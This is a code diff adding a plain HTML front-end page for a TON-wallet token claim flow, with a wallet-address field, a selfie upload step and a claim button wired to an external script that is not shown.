@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="webpay.css">
+    <title>Connect Wallet</title>
+</head>
+<body>
+    <div class="container">
+        <div class="wallet-section">
+            <h2>Connect Your Ton Wallet</h2>
+            <input type="text" id="walletInput" placeholder="Enter Your Ton Wallet Address" />
+            <button id="connectButton" onclick="validateWallet()">Connect Wallet</button>
+        </div>
+        <div class="selfie-section" id="selfieSection" style="display:none;">
+            <h2>Selfie Verification</h2>
+            <input type="file" id="selfieInput" accept="image/*" />
+            <button onclick="uploadSelfie()">Upload Selfie</button>
+        </div>
+        <div class="claim-section" id="claimSection" style="display:none;">
+            <h2>Claim Your Token</h2>
+            <p id="walletAddress"></p>
+            <button id="claimButton" onclick="processClaim()">Claim Token</button>
+        </div>
+    </div>
+
+    <!-- Loading screen for selfie upload -->
+    <div id="loading-screen" class="loading-screen" style="display:none;">
+        <div class="spinner"></div>
+        <p class="message">Processing your selfie, please wait...</p>
+    </div>
+
+    <script src="webpay.js"></script>
+</body>
+</html>
+
+
+
